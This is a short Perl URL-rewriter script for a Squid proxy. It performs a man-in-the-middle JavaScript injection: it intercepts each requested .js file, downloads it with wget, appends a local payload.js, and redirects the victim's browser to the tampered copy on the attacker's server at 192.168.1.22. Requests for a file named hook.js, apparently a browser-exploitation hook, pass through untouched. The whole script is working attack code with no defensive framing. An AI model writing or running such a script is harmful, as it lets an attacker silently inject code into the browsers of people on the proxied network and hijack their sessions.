#!/usr/bin/perl

$|=1;
$count = 0;
$pid = $$;

while (<>) {
	chomp;
	@X = split;
	$url = $X[1];
	if ($_ =~ /(.*\.js)/i) {
		if ($_ =~ /(hook\.js)/i) {
			print $X[0]." \n";
		} else {
		$hyperlink = $1;
		system("/usr/bin/wget","-q","-O","/var/www/html/tmp/$pid-$count.js","$hyperlink");
		system("chmod o+r /var/www/html/tmp/$pid-$count.js");
		system("cat /etc/squid3/payload.js >> /var/www/html/tmp/$pid-$count.js");
		print "http://192.168.1.22/tmp/$pid-$count.js\n";
		}
	} else {
		# UPGRADE WARNING: URL rewriter reponded with garbage  space
		print $X[0]." \n";
	}
$count++;
}
